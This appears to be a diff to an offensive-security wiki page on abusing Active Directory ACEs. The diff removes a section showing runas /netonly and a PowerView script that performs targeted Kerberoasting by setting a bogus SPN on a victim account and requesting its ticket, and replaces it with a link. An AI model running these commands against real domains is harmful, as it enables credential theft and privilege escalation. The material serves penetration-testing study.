@@ -12,33 +12,7 @@ When misconfigured, ACEs can be abused to operate lateral movement or privilege 
 
 ### Requirements
 
-The attacker needs to be in control of the object the ACE is set on to abuse it and possibly gain control over what this ACE applies to. The following abuses can only be carried out when running commands as the user the ACE is set on.
-
-{% tabs %}
-{% tab title="RunAs" %}
-RunAs is a standard command that allows to execute a program under a different user account. When stuffing an Active Directory account's password, the `/netonly` flag must be set to indicate the credentials are to be used for remote access only.
-
-```bash
-runas /netonly /user:$DOMAIN\$USER "powershell.exe"
-```
-
-Since the password cannot be supplied as an argument, the session must be interactive.
-{% endtab %}
-
-{% tab title="PowerView" %}
-Most of [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1)'s functions have the `-Credential`, `-Domain` and `-Server` parameters that can be used to explicitly specify the user to run as, the target Domain and and the target Domain Controller. This can be useful when trying to this from a Windows system that isn't enrolled in the AD domain.
-
-Here is an example for [targeted Kerberoasting](targeted-kerberoasting.md).
-
-```bash
-$SecPassword = ConvertTo-SecureString 'pasword_of_user_to_run_as' -AsPlainText -Force
-$Cred = New-Object System.Management.Automation.PSCredential('FQDN.DOMAIN\user_to_run_as', $SecPassword)
-Set-DomainObject -Credential $Cred -Domain 'FQDN.DOMAIN' -Server 'Domain_Controller' -Identity 'victimuser' -Set @{serviceprincipalname='nonexistant/BLAHBLAH'}
-$User = Get-DomainUser -Credential $Cred -Domain 'FQDN.DOMAIN' -Server 'Domain_Controller' 'victimuser'
-$User | Get-DomainSPNTicket -Credential $Cred -Domain 'FQDN.DOMAIN' -Server 'Domain_Controller' | fl
-```
-{% endtab %}
-{% endtabs %}
+The attacker needs to be in control of the object the ACE is set on to abuse it and possibly gain control over what this ACE applies to. The following abuses can only be carried out when running commands as the user the ACE is set on \(see [impersonation techniques](../credentials/impersonation.md)\).
 
 {% hint style="info" %}
 **Windows or UNIX ?**
